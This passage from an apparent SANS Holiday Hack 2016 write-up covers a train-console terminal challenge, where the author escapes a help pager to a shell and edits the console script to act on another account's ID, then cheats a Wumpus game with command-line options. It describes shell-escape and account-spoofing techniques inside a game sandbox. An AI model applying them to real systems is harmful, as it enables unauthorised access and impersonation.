&lt;span class=&quot;na&quot;&gt;HELP&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                           &lt;span class=&quot;s&quot;&gt;Open the help document&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;QUIT&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                           &lt;span class=&quot;s&quot;&gt;Exit console&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;menu:main&amp;gt; HELP&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;sh-4.3$&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now I have a shell.  A quick &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -la&lt;/code&gt; will show the other files in the current directory.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;sh-4.3$ ls -la&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;total 40&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x 2 conductor conductor  4096 Dec 10 19:39 .&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;drwxr-xr-x 6 root      root       4096 Dec 10 19:39 ..&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r-- 1 conductor conductor   220 Nov 12  2014 .bash_logout&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r-- 1 conductor conductor  3515 Nov 12  2014 .bashrc&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r-- 1 conductor conductor   675 Nov 12  2014 .profile&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rwxr-xr-x 1 root      root      10528 Dec 10 19:36 ActivateTrain&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rw-r--r-- 1 root      root       1506 Dec 10 19:36 TrainHelper.txt&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;-rwxr-xr-x 1 root      root       1588 Dec 10 19:36 Train_Console&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;sh-4.3$&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To activate the train, all I need to do is run &lt;code class=&quot;highlighter-rouge&quot;&gt;./ActivateTrain&lt;/code&gt; and I will be transported back to 1978.&lt;/p&gt;

&lt;p&gt;Santa is hiding out in this area too.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/Coin_time_travel.png&quot; alt=&quot;challenge_coin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Back to the future!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/terminal_1978.png&quot; alt=&quot;challenge_coin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;One last thing, if you view the &lt;code class=&quot;highlighter-rouge&quot;&gt;Train_Console&lt;/code&gt; script, you can see how the game sends a user back in time.&lt;/p&gt;

&lt;p&gt;To test if I could send another user back in time, I quickly created a second account, collected the Cranberry Pi parts required and logged into this terminal on a different browser.  Here is the output of the original &lt;code class=&quot;highlighter-rouge&quot;&gt;Train_Console&lt;/code&gt; script.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;sh-4.3$ cat Train_Console&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;HOMEDIR=&quot;/home/conductor&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;CTRL=&quot;$HOMEDIR/&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;DOC=&quot;$HOMEDIR/TrainHelper.txt&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;PAGER=&quot;less&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;BRAKE=&quot;on&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;PASS=&quot;24fb3e89ce2aa0ea422c3d511d40dd84&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;print_header() {&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;Train Management Console&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;AUTHORIZED USERS ONLY&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;&quot;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;print_main_menu() {&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;                  ==== MAIN MENU ====&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;STATUS&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                   &lt;span class=&quot;s&quot;&gt;Train Status&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;BRAKEON&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                  &lt;span class=&quot;s&quot;&gt;Set Brakes&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;BRAKEOFF&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                 &lt;span class=&quot;s&quot;&gt;Release Brakes&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;START&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                    &lt;span class=&quot;s&quot;&gt;Start Train&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;HELP&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                     &lt;span class=&quot;s&quot;&gt;Open the help document&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;QUIT&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                     &lt;span class=&quot;s&quot;&gt;Exit console&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo -n &quot;menu:main&amp;gt; &quot;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# MAIN&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;trap &quot;exit&quot; SIGHUP SIGINT SIGTERM SIGQUIT&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;print_header&lt;/span&gt;

&lt;span class=&quot;s&quot;&gt;while(true); do&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;print_main_menu&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;read ARG&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;&quot;&lt;/span&gt;

        &lt;span class=&quot;s&quot;&gt;if [[ ! $ARG ]] ; then&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;echo &quot;Please select an number&quot;&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;continue&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;fi&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;case &quot;$ARG&quot; in&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;STATUS)&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo &quot;Brake&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                            &lt;span class=&quot;s&quot;&gt;$BRAKE&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo &quot;BoilerOn&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                         &lt;span class=&quot;s&quot;&gt;Yes&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo &quot;BoilerTemp&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                       &lt;span class=&quot;s&quot;&gt;Normal&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo &quot;Coal Capacity Level&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;              &lt;span class=&quot;s&quot;&gt;97%&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo &quot;FluxCapacitor&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                    &lt;span class=&quot;s&quot;&gt;Fluxing&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo &quot;Top Speed&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                        &lt;span class=&quot;s&quot;&gt;88mph&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;;;&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;BRAKEON)&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;sleep 1&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;BRAKE=&quot;on&quot;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;echo &quot;QUIT&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;                             &lt;span class=&quot;s&quot;&gt;Exit console&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo &quot;The brake has been applied.&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo $BRAKE&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;;;&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;BRAKEOFF)&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;sleep 1&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;BRAKE=&quot;off&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo &quot;*******CAUTION*******&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo &quot;The brake has been released!&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo &quot;*******CAUTION*******&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo $BRAKE&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;;;&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;START)&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;echo  &quot;Checking brakes....&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;sleep 3&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;if [ $BRAKE == &quot;on&quot; ] ; then&lt;/span&gt;
                                &lt;span class=&quot;s&quot;&gt;echo &quot;Brake must be off to start the train.&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;else&lt;/span&gt;
                                &lt;span class=&quot;s&quot;&gt;read -s -p &quot;Enter Password&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;password&lt;/span&gt;
                                &lt;span class=&quot;s&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;$password&quot; == &quot;$PASS&quot; ] &amp;amp;&amp;amp; QUEST_UID=$QUEST_UID ./ActivateTrain || echo &quot;Access denied&quot;&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;fi&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;continue&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;;;&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;HELP) $PAGER $DOC&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;;;&lt;/span&gt;
                &lt;span class=&quot;s&quot;&gt;QUIT) echo &quot;Exiting&quot; ; exit&lt;/span&gt;
                        &lt;span class=&quot;s&quot;&gt;;;&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;esac&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Running the &lt;code class=&quot;highlighter-rouge&quot;&gt;env&lt;/code&gt; command will print out the environmental variables which includes your unique &lt;code class=&quot;highlighter-rouge&quot;&gt;QUEST_UID&lt;/code&gt; value.&lt;/p&gt;

&lt;p&gt;My Primary Account:&lt;/p&gt;
&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;sh-4.3$ env&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;HOSTNAME=2a3d1803b361&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;TERM=xterm&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;QUEST_UID=4152024d099e6dfa4649f7016a860dxxxxxxxxx&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# redacted&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;_=/usr/bin/env&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;PWD=/home/conductor&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;HOME=/home/conductor&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SHLVL=12&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;My Test Account:&lt;/p&gt;
&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;sh-4.3$ env&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;HOSTNAME=64fd641742ec&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;TERM=xterm&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;QUEST_UID=35ca097769d78a92364e3caff3cb75xxxxxxxxxx&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# redacted&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;_=/usr/bin/env&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;PWD=/home/conductor&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;SHLVL=3&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;HOME=/home/conductor&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In my primary account, I made a copy of the &lt;code class=&quot;highlighter-rouge&quot;&gt;Train_Console&lt;/code&gt; script and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;TC1&lt;/code&gt;.  I modified the &lt;code class=&quot;highlighter-rouge&quot;&gt;PASS=&quot;24fb3e89ce2aa0ea422c3d511d40dd84&quot;&lt;/code&gt; value to be simply &lt;code class=&quot;highlighter-rouge&quot;&gt;123&lt;/code&gt; to save from typing that long original password, set the &lt;code class=&quot;highlighter-rouge&quot;&gt;BREAK=&quot;Off&quot;&lt;/code&gt; and finally changed the &lt;code class=&quot;highlighter-rouge&quot;&gt;QUEST_UID=$QUEST_UID&lt;/code&gt; to be the hardcoded &lt;code class=&quot;highlighter-rouge&quot;&gt;QUEST_UID=35ca097769d78a92364e3caff3cb75xxxxxxxxx&lt;/code&gt; of my test account.&lt;/p&gt;

&lt;p&gt;Executed the script &lt;code class=&quot;highlighter-rouge&quot;&gt;./TC1&lt;/code&gt; then typed &lt;code class=&quot;highlighter-rouge&quot;&gt;START&lt;/code&gt; and pressed enter.  My test account was sent back in time!  Fortunately there is enough entropy in the &lt;code class=&quot;highlighter-rouge&quot;&gt;QUEST_UID&lt;/code&gt; value that I don’t see people sending random users back to 1978.  If you could social engineer someone in to giving you their &lt;code class=&quot;highlighter-rouge&quot;&gt;QUEST_UID&lt;/code&gt; value, you could send them back in time.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Although I’m sure this goes against the terms of service and I do not recommend anyone doing this!&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;wumpus-challenge&quot;&gt;Wumpus Challenge&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/terminal1_workshop_wumpus.png&quot; alt=&quot;terminal&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;challenge-objective--kill-the-wumpus&quot;&gt;Challenge Objective:  Kill the Wumpus&lt;/h3&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;*******************************************************************************&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;                                                                             &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Find the passphrase from the wumpus.  Play fair or &quot;cheat&quot;; it's up to you. *&lt;/span&gt; 
&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;                                                                             &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*******************************************************************************&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I started the game and successfully killed the Wumpus on the first try.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;./wumpus&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Instructions? (y-n) n&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;You're in a cave with 20 rooms and 3 tunnels leading from each room.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;There are 3 bats and 3 pits scattered throughout the cave, and your&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;quiver holds 5 custom super anti-evil Wumpus arrows.  Good luck.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;You are in room 2 of the cave, and have 5 arrows left.&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;*sniff&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(I can smell the evil Wumpus nearby!)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;There are tunnels to rooms 5, 7, and 19.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Move or shoot? (m-s) s19&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;*thwock&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;!*&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;*groan&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;*crash&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;A horrible roar fills the cave, and you realize, with a smile, that you&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;have slain the evil Wumpus and won the game!  You don't want to tarry for&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;long, however, because not only is the Wumpus famous, but the stench of&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;dead Wumpus is also quite well known, a stench plenty enough to slay the&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;mightiest adventurer at a single whiff!!&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Passphrase&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;WUMPUS IS MISUNDERSTOOD&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Passphrase: &lt;code class=&quot;highlighter-rouge&quot;&gt;WUMPUS IS MISUNDERSTOOD&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This is great! I completed the challenge and obtained the passphase.  However, the challenge banner stated that it was possible to cheat and I wanted to know how to do so.  I ran strings on the &lt;code class=&quot;highlighter-rouge&quot;&gt;wumpus&lt;/code&gt; file but when nothing jumped out at me, I turned to the Internet and found what seems the be the &lt;a href=&quot;https://github.com/vattam/BSDGames/blob/master/wump/wump.c&quot;&gt;original source code&lt;/a&gt; for the game “wump.”  I wasn’t sure how much the source code had been modified in our version but at least it gave me an idea of what the game’s logic could be.&lt;/p&gt;

&lt;p&gt;I also noticed that lines 791-795 seem to be command line arguments but I wasn’t sure what they did yet.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;{&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;(void)fprintf(stderr&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt;
 &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;usage:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;wump&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-h]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-a&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;arrows]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-b&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;bats]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-p&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pits]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-r&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;rooms]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[-t&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;tunnels]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;);&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;exit(1);&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Digging a little deeper I found an explanation for those options in an &lt;a href=&quot;https://web.archive.org/web/20090214233010/http://linux.die.net/man/6/wump&quot;&gt;archived wumpus man page&lt;/a&gt; thanks to &lt;img src=&quot;https://web.archive.org&quot; alt=&quot;web.archive.org&quot; /&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sans2016/wumpus_man.png&quot; alt=&quot;wumpus_man&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s create a cave with only 6 rooms (-r 6) for the Wumpus to hide and 100 arrows (-a 100) instead of the default 20 rooms and 5 arrows. I like my odds…&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;./wumpus -r 6 -a 100&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Instructions? (y-n) n&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;You're in a cave with 6 rooms and 3 tunnels leading from each room.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;There are 3 bats and 3 pits scattered throughout the cave, and your&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;quiver holds 100 custom super anti-evil Wumpus arrows.  Good luck.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;You are in room 6 of the cave, and have 100 arrows left.&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;*rustle&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;*rustle&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(must be bats nearby)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;*whoosh&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(I feel a draft from some pits).&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;*sniff&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(I can smell the evil Wumpus nearby!)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;There are tunnels to rooms 1, 4, and 5.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Move or shoot? (m-s) s1&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;*whoosh&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(I feel a draft from some pits).&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;*sniff&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(I can smell the evil Wumpus nearby!)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;There are tunnels to rooms 1, 4, and 5.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Move or shoot? (m-s) s2&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;*thunk&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;The arrow can't find a way from 6 to 2 and flys randomly&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;into room 4!&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;You are in room 6 of the cave, and have 98 arrows left.&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;*rustle&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;*rustle&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(must be bats nearby)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;*whoosh&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(I feel a draft from some pits).&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;*sniff&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;(I can smell the evil Wumpus nearby!)&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;There are tunnels to rooms 1, 4, and 5.&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;Move or shoot? (m-s) s3&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;*thunk&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;The arrow can't find a way from 6 to 3 and flys randomly&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;into room 5!&lt;/span&gt;
